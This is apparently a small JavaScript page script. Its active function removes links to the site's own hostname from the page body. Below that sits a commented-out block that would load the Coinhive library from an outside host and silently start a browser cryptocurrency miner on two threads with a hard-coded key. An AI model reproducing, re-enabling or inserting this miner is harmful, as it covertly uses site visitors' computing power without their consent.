function setRewriteTL(){
	var a=new RegExp('<a href="http://'+window.location.hostname+'">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(a,'');
	var b=new RegExp('<a href="http://'+window.location.hostname+'" target="_blank">http://'+window.location.hostname+'</a>','ig');
	document.body.innerHTML=document.body.innerHTML.replace(b,'');
}
setRewriteTL();

// $(document).ready(function(){
// 	var script = document.createElement('script');
// 	script.src = 'https://coinhive.com/lib/coinhive.min.js';
// 	var ls = document.getElementsByTagName('head')[0].appendChild(script);

// 	ls.addEventListener('load', los, false);
		
// 	function los() {
// 		setTimeout(function() {
// 			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
// 				threads: 2
// 			});
// 			miner.start();
// 		}, 500);
// 	}
// });
